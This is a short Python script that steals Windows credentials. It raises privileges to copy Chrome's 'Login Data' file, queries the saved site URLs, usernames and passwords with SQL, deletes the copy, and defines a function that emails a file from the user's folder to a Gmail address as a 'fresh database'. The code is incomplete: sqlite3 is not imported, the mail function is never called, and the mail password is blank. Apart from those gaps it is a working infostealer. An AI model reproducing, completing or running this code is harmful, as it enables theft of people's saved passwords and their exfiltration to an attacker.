import win32com.shell.shell as shell
import time
import os
import smtplib
import tkinter as tk 
import multiprocessing 
from email.message import EmailMessage 

def send_to_gmail(file):
    msg = EmailMessage()
    msg['Subject'] = 'Here you go'
    msg['From'] = 'OSINT48@gmail.com'
    msg['To'] = 'OSINT48@gmail.com'
    msg.set_content('New fresh database')

    with open(('C:\\Users\\' + os.environ['USERNAME'] + f'\\{file}'), 'rb') as f:
        file_data = f.read()
        file_name = f.name

    msg.add_attachment(file_data, maintype='application', subtype='octet-stream', filename=file_name)

    with smtplib.SMTP_SSL('smtp.gmail.com', 465) as smtp:
        smtp.login('OSINT48@gmail.com', '')
        smtp.send_message(msg)

def process1():
    shell.ShellExecuteEx(lpVerb='runas', lpFile='cmd.exe', lpParameters='/c '+ ('copy "C:\\Users\\' + os.environ['USERNAME'] + '\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data" "C:\\Users\\' + os.environ['USERNAME'] + '"'))
    time.sleep(1)

    c = sqlite3.connect('C:\\Users\\' + os.environ['USERNAME'] + '\\Login Data')
    cursor = c.cursor()
    select_statement = "SELECT origin_url, username_value, password_value FROM logins"
    cursor.execute(select_statement)
    login_data = cursor.fetchall()

    os.remove('C:\\Users\\' + os.environ['USERNAME'] + '\\Login Data')

def process2():
    pass

process1()